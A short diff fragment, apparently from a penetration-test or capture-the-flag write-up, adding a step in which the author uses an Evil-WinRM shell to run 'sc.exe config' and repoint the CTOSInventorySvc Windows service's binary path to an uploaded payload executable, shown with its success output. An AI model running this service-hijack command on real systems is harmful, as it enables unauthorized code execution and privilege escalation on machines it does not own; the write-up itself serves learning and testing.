@@ -937,3 +937,9 @@ Info: Upload successful!
 
 Ill now upload the payload
 
+```python
+*Evil-WinRM* PS C:\Program Files\CTOS\InventoryService> sc.exe config CTOSInventorySvc binPath= "C:\Users\l_conrad\Documents\http.x64.exe"
+[SC] ChangeServiceConfig SUCCESS
+```
+
+Ill then change the binpath to my payload
